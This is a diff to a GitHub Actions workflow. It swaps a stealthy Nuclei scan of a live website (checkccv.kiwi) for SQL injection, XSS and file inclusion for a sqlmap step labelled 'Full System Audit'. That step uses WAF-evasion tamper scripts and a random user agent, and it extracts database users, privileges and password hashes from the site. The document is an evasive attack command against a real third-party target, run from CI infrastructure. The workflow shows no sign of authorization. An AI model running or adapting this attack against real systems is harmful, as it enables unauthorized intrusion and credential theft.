@@ -1,21 +1,20 @@
-name: Nuclei Stealth Scan
-
-on:
-  workflow_dispatch:
-
-jobs:
-  nuclei-scan:
-    runs-on: ubuntu-latest
-
-    steps:
-    - name: Checkout Code
-      uses: actions/checkout@v4
-
-    - name: Run Nuclei Scan
-      uses: projectdiscovery/nuclei-action@main
-      with:
-        target: "https://checkccv.kiwi/?action=home&category=5"
-        tags: sqli,xss,lfi
-        # Đưa các tham số thành các cấu hình riêng biệt để tránh lỗi exit code 2
-        rate-limit: 1
-        concurrency: 1
+- name: Execute Full System Audit
+      run: |
+        cd sqlmap-dev
+        python3 sqlmap.py -u "https://checkccv.kiwi/?action=home&category=5" \
+          --force-dns \
+          --random-agent \
+          --tamper=space2comment,between,randomcase \
+          --delay=0.5 \
+          --threads=1 \
+          --level=3 \
+          --risk=2 \
+          --banner \
+          --current-user \
+          --current-db \
+          --is-dba \
+          --dbs \
+          --tables \
+          --passwords \
+          --privileges \
+          --batch
